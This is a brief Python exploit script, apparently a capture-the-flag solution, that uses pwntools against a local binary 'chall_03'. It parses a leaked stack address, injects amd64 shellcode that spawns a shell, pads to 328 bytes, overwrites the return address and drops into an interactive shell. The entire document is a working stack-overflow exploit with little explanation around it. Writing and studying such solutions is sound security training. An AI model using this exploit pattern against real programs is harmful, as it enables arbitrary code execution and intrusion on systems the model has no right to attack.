# using a memory address that the vulnerable program leaks (of a local variable), direct the program to execute shellcode that we inject onto the stack.
from pwn import *

p = process("./chall_03")

p.recvuntil(b"0x")

leak = p64(int(b"0x" + p.recvuntil(b"\n")[0:-1], 16))

context.arch = "amd64"
shellcode_bytes = asm(shellcraft.sh())

payload = shellcode_bytes + (328 - len(shellcode_bytes)) * b"A" + leak

p.sendline(payload)

p.interactive()
